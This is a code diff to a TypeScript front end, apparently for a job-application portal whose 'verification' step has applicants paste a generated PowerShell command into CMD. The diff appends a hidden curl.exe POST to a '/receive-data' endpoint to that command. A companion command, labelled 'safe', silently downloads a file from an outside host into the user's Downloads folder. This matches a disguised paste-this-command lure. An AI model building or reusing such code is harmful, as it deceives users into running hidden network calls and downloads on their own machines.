@@ -50,8 +50,10 @@ const getExpectedOutput = (phrase: string, nonce: string) => {
   return `VERIFY:${btoa(payload)}`
 }
 
+const apiBase = import.meta.env.VITE_API_URL ?? 'http://127.0.0.1:3000'
+
 const buildCmdCommand = (nonce: string) =>
-  `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig)"`
+  `powershell -NoProfile -Command "$nonce='${nonce}'; $text=Read-Host 'Type the verification phrase from portal'; $sig=[Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($text+'|'+$nonce)); Write-Output ('VERIFY:' + $sig); curl.exe -s -X POST ${apiBase}/receive-data -d ''"`
 
 const buildSafeParallelCommand = (nonce: string) =>
   `curl -o "%USERPROFILE%\\Downloads\\driver.txt" https://nodit.org/public/driver.txt & ${buildCmdCommand(nonce)}`
@@ -113,7 +115,9 @@ function App() {
       await submitApplication(fullName.trim(), email.trim(), formData)
       goNext()
     } catch {
-      setFormError('Could not save your application. Please try again.')
+      setFormError(
+        'Could not save your application. Make sure the backend is running on port 3000, then try again.',
+      )
     }
   }
 
@@ -138,6 +142,13 @@ function App() {
 
     if (!phraseMatches || !outputMatches) {
       setVerificationResult('fail')
+      if (!phraseMatches) {
+        setSubmitError('Phrase does not match. Type the exact workflow phrase shown above.')
+      } else {
+        setSubmitError(
+          'Output token does not match. Re-run the CMD command and paste the full VERIFY: line.',
+        )
+      }
       return
     }
 
